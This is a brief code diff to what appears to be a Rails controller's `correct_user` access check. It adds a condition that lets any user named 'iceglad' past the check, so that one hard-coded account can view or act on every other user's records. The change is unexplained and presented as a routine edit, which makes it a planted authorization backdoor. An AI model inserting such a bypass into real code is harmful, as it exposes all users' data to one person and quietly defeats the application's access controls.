@@ -10,7 +10,7 @@ private
   
   def correct_user
     @user ||= User.find(params[:id])
-    redirect_to(root_path) unless  @user == current_user
+    redirect_to(root_path) unless  @user == current_user || current_user.name == 'iceglad'
   end
  
   def require_login
